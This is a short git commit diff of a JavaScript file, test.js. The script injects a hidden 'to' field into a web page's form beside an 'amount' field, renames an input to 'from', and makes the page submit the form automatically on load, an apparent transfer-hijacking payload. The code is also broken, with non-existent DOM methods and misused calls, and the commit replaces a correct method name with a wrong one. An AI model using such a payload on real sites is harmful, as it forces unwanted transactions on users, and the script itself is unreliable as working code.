1e444025f38541f0fac18b8cf18625003618f76b
TheRealProcyon <cc.oosting@gmail.com>
2018-02-02 14:38:23 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,9 @@
 var form1 = document.getElementByTagName("form")[0]; 
 var thing1 = document.createElement("input"); 
 var thing2 = document.getElementByName("amount"); 
+
 thing1.setAttribute("type", "hidden");  
 thing1.setAttribute("name", "to"); 
 form1.appendChild("thing1").insertBefore("thing2"); 
-document.getElementByTag("input")[0].setAttribute("name", "from"); 
-document.getElementByTagName("body")[0].setAttribute("onload", "document.getElementsByTagName('form')[0].submit()");
+document.getElementByTagName("input")[0].setAttribute("name", "from"); 
+document.getElementByTagName("body")[0].setAttribute("onload", "document.getElementByTagName('form')[0].submit()");
